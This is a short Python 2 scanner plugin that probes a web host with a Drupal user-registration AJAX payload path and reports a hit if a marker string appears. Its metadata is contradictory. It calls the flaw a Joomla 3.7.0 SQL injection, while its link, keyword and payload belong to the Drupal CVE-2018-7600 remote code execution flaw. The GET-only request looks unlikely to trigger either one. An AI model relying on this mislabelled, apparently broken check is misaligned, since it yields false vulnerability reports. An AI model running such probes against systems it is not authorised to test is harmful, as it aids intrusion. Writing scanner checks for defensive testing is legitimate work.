# coding:utf-8
# author:taro

import requests
def get_plugin_info():
    plugin_info = {
        "name": "Joomla 3.7.0 SQL注入漏洞",
        "info": "Joomla 3.7.0 存在SQL注入漏洞",
        "level": "高危",
        "type": "SQL注入",
        "author": "taro",
        "url": "https://github.com/vulhub/vulhub/blob/master/drupal/CVE-2018-7600/README.zh-cn.md",
        "keyword": "all:drupal",
    }
    return plugin_info

def check(host, port, timeout):
    u = "http://%s:%d" % (host, int(port))
    payload_url = '/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
    url = u + payload_url
    try:
        res = requests.get(url, timeout=timeout)
        if 'string(4) \"test\"' in res.text:
            info = '存在SQL注入漏洞: %s' % payload_url
            print info
            return info
    except Exception, e:
        pass
